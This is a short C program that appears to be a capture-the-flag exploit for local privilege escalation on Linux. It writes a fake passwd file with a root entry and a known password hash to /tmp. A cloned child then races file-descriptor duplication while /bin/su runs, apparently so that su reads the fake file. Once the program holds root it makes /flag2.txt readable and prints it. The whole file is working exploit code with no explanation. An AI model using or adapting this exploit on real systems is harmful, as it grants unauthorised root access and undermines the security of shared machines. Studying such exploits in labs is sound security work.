#define _GNU_SOURCE

#include <sched.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>

// The password for the root user is "1" (without quotation marks).
#define FAKE_PASSWD "/tmp/passwd"
#define FAKE_ROOT "root:nnNMRAmF.Fsug:0:1000::/:/bin/sh\n"

static int fd;

static int child(void *arg)
{
	for (int i = 0; i < 1000000; ++i) {
		dup2(fd, fd + 1);
		close(fd + 1);
	}

	return -1;
}

int main(int argc, char **argv)
{
	static char stk[4096];

	if (geteuid() == 0) {
		chmod("/flag2.txt", 0777);
		read(open("/flag2.txt", O_RDONLY), stk, sizeof(stk));
		write(STDOUT_FILENO, stk, sizeof(stk));
		return 0;
	}

	fd = open(FAKE_PASSWD, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	write(fd, FAKE_ROOT, sizeof(FAKE_ROOT));
	close(fd);

	fd = open(FAKE_PASSWD, O_RDONLY);

	clone(&child, stk + sizeof(stk), CLONE_FILES | CLONE_PARENT | SIGCHLD,
	      NULL);
	execve("/bin/su", (char *[]){ "/bin/su", "-s", argv[0], NULL }, NULL);

	return -1;
}
